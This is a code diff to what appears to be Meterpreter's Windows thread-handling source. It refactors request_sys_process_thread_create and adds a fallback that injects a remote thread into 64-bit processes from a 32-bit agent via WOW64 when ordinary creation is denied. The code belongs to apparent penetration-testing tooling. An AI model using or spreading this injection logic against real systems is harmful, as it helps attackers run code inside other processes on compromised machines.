@@ -1,10 +1,32 @@
 #include "precomp.h"
 #include "../../../../../common/arch/win/remote_thread.h"
+#include "../../../../../common/arch/win/i386/base_inject.h"
 
-ULONG get_thread_register_value(LPCONTEXT context, LPCSTR name,
-	DWORD size);
-VOID set_thread_register_value(LPCONTEXT, LPCSTR name, 
-	ULONG value);
+ULONG get_thread_register_value(LPCONTEXT context, LPCSTR name, DWORD size);
+VOID set_thread_register_value(LPCONTEXT, LPCSTR name, ULONG value);
+
+typedef BOOL (WINAPI *PISWOW64PROCESS)(HANDLE, PBOOL);
+static PISWOW64PROCESS pIsWow64Process = NULL;
+
+BOOL IsWow64Process(HANDLE hProcess)
+{
+	BOOL result = FALSE;
+
+	if (!pIsWow64Process)
+	{
+		pIsWow64Process = (PISWOW64PROCESS)GetProcAddress(GetModuleHandleA("kernel32.dll"), "IsWow64Process");
+	}
+
+	if (pIsWow64Process)
+	{
+		if (!pIsWow64Process(hProcess, &result))
+		{
+			result = FALSE;
+		}
+	}
+
+	return result;
+}
 
 /*
  * Opens a thread with the supplied identifier using the supplied permissions
@@ -42,8 +64,7 @@ DWORD request_sys_process_thread_open(Remote *remote, Packet *packet)
 		}
 
 		// Add the handle to the response packet
-		packet_add_tlv_uint(response, TLV_TYPE_THREAD_HANDLE, 
-				(DWORD)handle);
+		packet_add_tlv_uint(response, TLV_TYPE_THREAD_HANDLE, (DWORD)handle);
 
 	} while (0);
 
@@ -66,43 +87,73 @@ DWORD request_sys_process_thread_open(Remote *remote, Packet *packet)
 DWORD request_sys_process_thread_create(Remote *remote, Packet *packet)
 {
 	Packet *response = packet_create_response(packet);
-	HANDLE process, thread = NULL;
-	LPVOID entryPoint;
-	LPVOID entryParam;
-	DWORD result = ERROR_SUCCESS;
-	DWORD createFlags;
-	DWORD threadId;
+	HANDLE hProcess, hThread = NULL;
+	LPVOID lpEntryPoint;
+	LPVOID lpEntryParam;
+	DWORD dwResult = ERROR_SUCCESS;
+	DWORD dwCreateFlags;
+	DWORD dwThreadId;
 
 	// Snag the parameters
-	process     = (HANDLE)packet_get_tlv_value_uint(packet, TLV_TYPE_PROCESS_HANDLE);
-	entryPoint  = (LPVOID)packet_get_tlv_value_uint(packet, TLV_TYPE_ENTRY_POINT);
-	entryParam  = (LPVOID)packet_get_tlv_value_uint(packet, TLV_TYPE_ENTRY_PARAMETER);
-	createFlags = packet_get_tlv_value_uint(packet, TLV_TYPE_CREATION_FLAGS);
+	hProcess     = (HANDLE)packet_get_tlv_value_uint(packet, TLV_TYPE_PROCESS_HANDLE);
+	lpEntryPoint  = (LPVOID)packet_get_tlv_value_uint(packet, TLV_TYPE_ENTRY_POINT);
+	lpEntryParam  = (LPVOID)packet_get_tlv_value_uint(packet, TLV_TYPE_ENTRY_PARAMETER);
+	dwCreateFlags = packet_get_tlv_value_uint(packet, TLV_TYPE_CREATION_FLAGS);
 
 	do
 	{
 		// No process handle or entry point?
-		if ((!process) ||
-		    (!entryPoint))
+		if (!hProcess || !lpEntryPoint)
 		{
-			result = ERROR_INVALID_PARAMETER;
+			dwResult = ERROR_INVALID_PARAMETER;
 			break;
 		}
+
+		dprintf("[THREAD CREATE] CreateFlags: %x", dwCreateFlags);
 
 		// Create the thread in the process supplied
-		if (!(thread = create_remote_thread(process, 0, entryPoint, entryParam, createFlags, &threadId)))
+		if (!(hThread = create_remote_thread(hProcess, 0, lpEntryPoint, lpEntryParam, dwCreateFlags, &dwThreadId)))
 		{
-			result = GetLastError();
-			break;
+			dprintf("[THREAD CREATE] Failed to create remote thread");
+			dwResult = GetLastError();
+
+			if (dwResult == ERROR_ACCESS_DENIED
+				&& dwMeterpreterArch == PROCESS_ARCH_X86
+				&& IsWow64Process(GetCurrentProcess())
+				&& !IsWow64Process(hProcess))
+			{
+				dprintf("[THREAD CREATE] Target is x64, attempting wow64 injection");
+
+				// looking good, let's see if we can do the wow64 injection.
+				dwResult = inject_via_remotethread_wow64(hProcess, lpEntryPoint, lpEntryParam, &hThread);
+				if (dwResult != ERROR_SUCCESS)
+				{
+					dprintf("[THREAD CREATE] Wow64 injection failed: %u (%x)", dwResult, dwResult);
+					break;
+				}
+
+				// the wow64 thread creation creates the thread in a suspended state, so unless there
+				// is the suspended flag set, we need to resume it
+				if ((dwCreateFlags & CREATE_SUSPENDED) == 0)
+				{
+					ResumeThread(hThread);
+				}
+			}
+			else
+			{
+				dprintf("[THREAD CREATE] Thread creation failed: %u (%x)", dwResult, dwResult);
+				break;
+			}
 		}
 
+		dprintf("[THREAD CREATE] Thread creation succeeded");
 		// Set the thread identifier and handle on the response
-		packet_add_tlv_uint(response, TLV_TYPE_THREAD_ID, threadId);
-		packet_add_tlv_uint(response, TLV_TYPE_THREAD_HANDLE, (DWORD)thread);
+		packet_add_tlv_uint(response, TLV_TYPE_THREAD_ID, dwThreadId);
+		packet_add_tlv_uint(response, TLV_TYPE_THREAD_HANDLE, (DWORD)hThread);
 
 	} while (0);
 
-	packet_transmit_response(result, remote, response);
+	packet_transmit_response(dwResult, remote, response);
 
 	return ERROR_SUCCESS;
 }
